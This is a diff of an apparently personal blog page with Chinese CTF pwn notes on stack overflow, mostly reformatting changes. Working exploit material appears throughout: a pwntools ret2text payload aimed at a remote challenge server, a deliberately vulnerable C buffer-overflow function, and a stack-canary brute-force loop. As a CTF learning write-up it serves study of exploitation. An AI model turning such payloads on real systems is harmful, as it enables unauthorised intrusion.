@@ -11,14 +11,13 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta http-equiv="Cache-Control" content="no-transform">
     <meta name="format-detection" content="telephone=no,email=no,adress=no">
-    <meta name="generator" content="Hugo 0.55.5" />
+    <meta name="generator" content="Hugo 0.56.3" />
     
     
         <title>CTF PWN刷题记录 CTFWiki_1栈溢出 - root@v</title>
     
     
-    
-<meta itemprop="name" content="CTF PWN刷题记录 CTFWiki_1栈溢出">
+    <meta itemprop="name" content="CTF PWN刷题记录 CTFWiki_1栈溢出">
 <meta itemprop="description" content="CTFWiki_1栈溢出">
 
 
@@ -38,8 +37,8 @@
 <meta property="og:image" content="https://vorblock.cc/favicon.svg" />
 
 <meta property="og:image" content="https://my-md-1253484710.cos.ap-chengdu.myqcloud.com/tx.jpg" />
-<meta property="article:published_time" content="2019-02-20T00:17:21&#43;08:00"/>
-<meta property="article:modified_time" content="2019-02-20T00:17:21&#43;08:00"/>
+<meta property="article:published_time" content="2019-02-20T00:17:21+08:00" />
+<meta property="article:modified_time" content="2019-02-20T00:17:21+08:00" />
 
     <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://vorblock.cc/favicon.svg"/>
@@ -299,8 +298,8 @@
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">   <span class="c1"># ragg2 -P 200 -r</span>
   AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA#</code></pre></div>
 <p>profile.rr2:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">  <span class="cp">#!/usr/bin/rarun2
-</span><span class="cp"></span>  <span class="nv">stdin</span><span class="o">=</span>./pattern.txt</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">  <span class="c1">#!/usr/bin/rarun2</span>
+  <span class="nv">stdin</span><span class="o">=</span>./pattern.txt</code></pre></div>
 <p><code>r2 -R profile.rr2 -d ret2text</code> or 直接<code>r2 -d ret2text</code></p>
 
 <p><code>dc</code>后输入复制的pattern字符串</p>
@@ -324,16 +323,17 @@
 
 <li><p>python pattern.py</p></li>
 
-<li><p>payload</p></li>
-</ul>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">  <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<li><p>payload</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
   
-  <span class="c1"># sh = process(./ret2text)</span>
-  <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.106.212.155&#34;</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>
-  <span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x0804863a</span>
-  <span class="n">payload</span> <span class="o">=</span> <span class="mi">112</span><span class="o">*</span><span class="s1">&#39;A&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
-  <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-  <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
+<span class="c1"># sh = process(./ret2text)</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.106.212.155&#34;</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x0804863a</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="mi">112</span><span class="o">*</span><span class="s1">&#39;A&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div></li>
+</ul>
+
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190412181108.png" alt="" /></p>
 
 <h6 id="ret2shellcode">ret2shellcode</h6>
@@ -587,13 +587,13 @@
 </span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
 </span><span class="cp"></span>
 <span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">()</span> <span class="p">{</span>
-    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-    <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+	<span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="s">&#34;Hello, World</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">13</span><span class="p">);</span>
-    <span class="n">vulnerable_function</span><span class="p">();</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="s">&#34;Hello, World</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">13</span><span class="p">);</span>
+	<span class="n">vulnerable_function</span><span class="p">();</span>
 <span class="p">}</span></code></pre></div>
 <p>exp:</p>
 <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"></code></pre></div>
@@ -760,7 +760,7 @@
       <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
   <span class="p">}</span></code></pre></div>
 <p>EXP</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">  <span class="ch">#!/usr/bin/env python</span>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">  <span class="c1">#!/usr/bin/env python</span>
    
   <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
    
@@ -788,30 +788,29 @@
    
   <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
 <ul>
-<li>one-by-one 爆破 Canary</li>
-</ul>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">  <span class="k">print</span> <span class="s2">&#34;[+] Brute forcing stack canary &#34;</span>
+<li><p>one-by-one 爆破 Canary</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">print</span> <span class="s2">&#34;[+] Brute forcing stack canary &#34;</span>
   
-  <span class="n">start</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
-  <span class="n">stop</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span>
+<span class="n">start</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="n">stop</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span>
   
-  <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">stop</span><span class="p">:</span>
-     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
-        <span class="n">res</span> <span class="o">=</span> <span class="n">send2server</span><span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">stop</span><span class="p">:</span>
+ <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">send2server</span><span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
   
-        <span class="k">if</span> <span class="n">res</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
-           <span class="n">p</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-           <span class="c1">#print &#34;\t[+] Byte found 0x%02x&#34; % i</span>
-           <span class="k">break</span>
+    <span class="k">if</span> <span class="n">res</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
+       <span class="n">p</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+       <span class="c1">#print &#34;\t[+] Byte found 0x%02x&#34; % i</span>
+       <span class="k">break</span>
   
-        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">255</span><span class="p">:</span>
-           <span class="k">print</span> <span class="s2">&#34;[-] Exploit failed&#34;</span>
-           <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">255</span><span class="p">:</span>
+       <span class="k">print</span> <span class="s2">&#34;[-] Exploit failed&#34;</span>
+       <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
   
   
-  <span class="n">canary</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">stop</span><span class="p">:</span><span class="n">start</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>
-  <span class="k">print</span> <span class="s2">&#34;   [+] SSP value is 0x</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> </code></pre></div>
-<ul>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">stop</span><span class="p">:</span><span class="n">start</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>
+<span class="k">print</span> <span class="s2">&#34;   [+] SSP value is 0x</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> </code></pre></div></li>
+
 <li><p>canary劫持__stack_chk_fail 函数</p></li>
 
 <li><p>覆盖 TLS 中储存的 Canary 值</p></li>
